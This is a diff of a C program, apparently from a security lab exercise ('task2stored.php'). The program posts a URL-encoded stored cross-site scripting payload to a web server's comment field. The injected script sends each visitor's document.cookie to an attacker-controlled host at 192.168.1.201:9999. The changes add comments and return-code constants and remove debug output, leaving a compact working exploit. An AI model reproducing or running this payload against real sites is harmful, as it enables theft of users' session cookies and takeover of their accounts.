@@ -19,11 +19,20 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+// web server IP
 #define WEB_IP "192.168.1.203"
+// web server port
 #define TARGET_PORT 80
+// PHP fir HTTPS request
 #define TARGET_PATH "/task2stored.php"
+// attacker ip + port
 #define ATTACKER_SERVER "192.168.1.201:9999"
+// maximum size for reading the web server response
 #define BUFFER_SIZE 4096
+// return value for failure
+#define FAILURE 0
+// return value for success
+#define SUCCESS 1
 
 /*
  * url_encode - URL encodes a string
@@ -46,7 +55,7 @@ static int url_encode(char *dest, size_t dest_size, const char *src) {
             int written = snprintf(&dest[dest_pos], dest_size - dest_pos,
                                   "%%%02X", (unsigned char)*src);
             if (written < 0 || dest_pos + (size_t)written >= dest_size) {
-                return -1;
+                return FAILURE;
             }
             dest_pos += (size_t)written;
         }
@@ -54,11 +63,11 @@ static int url_encode(char *dest, size_t dest_size, const char *src) {
     }
 
     if (dest_pos >= dest_size) {
-        return -1;
+        return FAILURE;
     }
 
     dest[dest_pos] = '\0';
-    return 0;
+    return SUCCESS;
 }
 
 int main(void) {
@@ -76,13 +85,10 @@ int main(void) {
              "<script>fetch('http://%s/?cookie='+document.cookie)</script>",
              ATTACKER_SERVER);
 
-    if (url_encode(encoded_payload, sizeof(encoded_payload), xss_payload) != 0) {
-        fprintf(stderr, "Error: Failed to URL encode payload\n");
-        return 1;
+    if (url_encode(encoded_payload, sizeof(encoded_payload), xss_payload) !=
+    SUCCESS) {
+        exit(EXIT_FAILURE);
     }
-
-    printf("XSS Payload: %s\n", xss_payload);
-    printf("Encoded Payload: %s\n", encoded_payload);
 
     snprintf(post_data, sizeof(post_data),
              "comment=%s", encoded_payload);
@@ -101,8 +107,7 @@ int main(void) {
 
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (sock_fd < 0) {
-        perror("Socket creation failed");
-        return 1;
+        exit(EXIT_FAILURE);
     }
 
     memset(&server_addr, 0, sizeof(server_addr));
@@ -110,43 +115,27 @@ int main(void) {
     server_addr.sin_port = htons(TARGET_PORT);
 
     if (inet_pton(AF_INET, WEB_IP, &server_addr.sin_addr) <= 0) {
-        perror("Invalid address");
         close(sock_fd);
-        return 1;
+        exit(EXIT_FAILURE);
     }
-
-    printf("Connecting to %s:%d...\n", WEB_IP, TARGET_PORT);
 
     if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Connection failed");
         close(sock_fd);
-        return 1;
+        exit(EXIT_FAILURE);
     }
-
-    printf("Connected successfully.\n");
-    printf("Sending POST request...\n\n");
-    printf("--- HTTP Request ---\n%s\n", http_request);
 
     bytes_sent = write(sock_fd, http_request, strlen(http_request));
     if (bytes_sent < 0) {
-        perror("Send failed");
         close(sock_fd);
-        return 1;
+        exit(EXIT_FAILURE);
     }
-
-    printf("Request sent (%zd bytes).\n", bytes_sent);
-    printf("Waiting for response...\n\n");
 
     memset(response_buffer, 0, BUFFER_SIZE);
     bytes_received = read(sock_fd, response_buffer, BUFFER_SIZE - 1);
     if (bytes_received < 0) {
-        perror("Receive failed");
         close(sock_fd);
-        return 1;
+        exit(EXIT_FAILURE);
     }
-
-    response_buffer[bytes_received] = '\0';
-    printf("--- HTTP Response ---\n%s\n", response_buffer);
 
     close(sock_fd);
 
